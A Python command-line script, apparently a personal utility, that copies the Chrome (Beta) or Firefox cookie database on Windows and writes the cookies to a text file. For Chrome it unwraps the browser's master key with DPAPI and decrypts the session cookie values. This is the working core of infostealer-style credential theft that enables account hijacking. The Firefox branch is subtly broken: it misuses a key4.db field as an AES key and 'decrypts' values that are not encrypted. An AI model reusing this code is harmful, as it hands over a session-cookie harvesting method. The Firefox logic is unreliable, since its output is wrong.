#### To be run on native Window only using it's python install through cmd.exe or powershell.exe

# The reason for this is that there is timing involved that is counted since the year 1601 or also called the "Epoch".
# And it is this timing that has to be considered when using Linux and Windows together such as in a WSL environment.
# My point is that if you use this script in WSL or native Linux and then point it to a chrome or firefox installation
# that is lcoated on a native Windows environment the timing in this script was not made for any conversions between the
# two and it MAY LOOK LIKE the script worked but you will find out sooner or later that the information stored in the
# output file was NOT correct. So, run this with using the WINDOWS version of python3 if for no other reason than to
# save yourself from yourself.

import os
import json
import base64
import sqlite3
import shutil
import argparse
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES

def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_encryption_key(browser):
    if browser == "chrome":
        local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome Beta", "User Data", "Local State")
    elif browser == "firefox":
        local_state_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(local_state_path):
            print("Firefox profile not found.")
            return None
        profiles = os.listdir(local_state_path)
        if not profiles:
            print("No Firefox profile found.")
            return None
        local_state_path = os.path.join(local_state_path, profiles[0], "key4.db")
        if not os.path.exists(local_state_path):
            print("Firefox key4.db not found.")
            return None

    if browser == "chrome":
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    elif browser == "firefox":
        conn = sqlite3.connect(local_state_path)
        c = conn.cursor()
        c.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
        key = c.fetchone()
        return key[1]

def decrypt_data(data, key, browser):
    if browser == "chrome":
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""
    elif browser == "firefox":
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            return ""

def main(args):
    browser = args.browser

    if browser == "chrome":
        db_path = args.input
        filename = os.path.join(os.environ["TEMP"], "Cookies.db")
    elif browser == "firefox":
        db_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        profiles = os.listdir(db_path)
        if not profiles:
            print("No Firefox profile found.")
            return
        db_path = os.path.join(db_path, profiles[0], "cookies.sqlite")
        filename = os.path.join(os.environ["TEMP"], "firefox_cookies.sqlite")

    if not os.path.isfile(db_path):
        print(f"{browser.capitalize()} cookie database not found.")
        return

    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    if browser == "chrome":
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
        FROM cookies""")
    elif browser == "firefox":
        cursor.execute("""
        SELECT host, name, value, creationTime, lastAccessed, expiry, isSecure, isHttpOnly, path 
        FROM moz_cookies""")

    key = get_encryption_key(browser)

    with open(args.output, "w") as cookie_file:
        if browser == "chrome":
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = decrypt_data(encrypted_value, key, browser)
                else:
                    decrypted_value = value

                if args.format == "netscape":
                    cookie_file.write(f"{host_key}\t{'TRUE' if host_key.startswith('.') else 'FALSE'}\t{host_key.lstrip('.')}\t{'TRUE' if 'secure' in host_key else 'FALSE'}\t{expires_utc}\t{name}\t{decrypted_value}\n")
                else:
                    cookie_file.write(f"""
                Host: {host_key}
                Cookie name: {name}
                Cookie value (decrypted): {decrypted_value}
                Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
                Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
                Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
    ===============================================================""")
        elif browser == "firefox":
            for host, name, value, creationTime, lastAccessed, expiry, isSecure, isHttpOnly, path in cursor.fetchall():
                decrypted_value = decrypt_data(value, key, browser)

                if args.format == "netscape":
                    cookie_file.write(f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{path}\t{'TRUE' if isSecure else 'FALSE'}\t{expiry}\t{name}\t{decrypted_value}\n")
                else:
                    cookie_file.write(f"""
                Host: {host}
                Cookie name: {name}
                Cookie value (decrypted): {decrypted_value}
                Creation datetime (UTC): {datetime.fromtimestamp(creationTime/1000000)}
                Last access datetime (UTC): {datetime.fromtimestamp(lastAccessed/1000000)}
                Expires datetime (UTC): {datetime.fromtimestamp(expiry)}
                Path: {path}
                Secure: {isSecure}
                HttpOnly: {isHttpOnly}
    ===============================================================""")

    db.close()
    os.remove(filename)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Chrome/Firefox Cookie Extractor")
    parser.add_argument("-f", "--format", type=str, default="none", choices=["netscape", "none"], help="Output format for the cookie data. Choose between 'netscape' and 'none'. Default is 'none'.")
    parser.add_argument("-b", "--browser", type=str, default="chrome", choices=["chrome", "firefox"], help="Browser to extract cookies from. Choose between 'chrome' and 'firefox'. Default is 'chrome'.")
    parser.add_argument("-i", "--input", type=str, default=os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome Beta", "User Data", "Default", "Network", "Cookies"), help="Path to the browser's cookie database file. Default is the standard location for Chrome Beta.")
    parser.add_argument("-o", "--output", type=str, default="Cookies.txt", help="Output file path for the extracted cookie data. Default is 'Cookies.txt' in the current directory.")
    args = parser.parse_args()
    main(args)
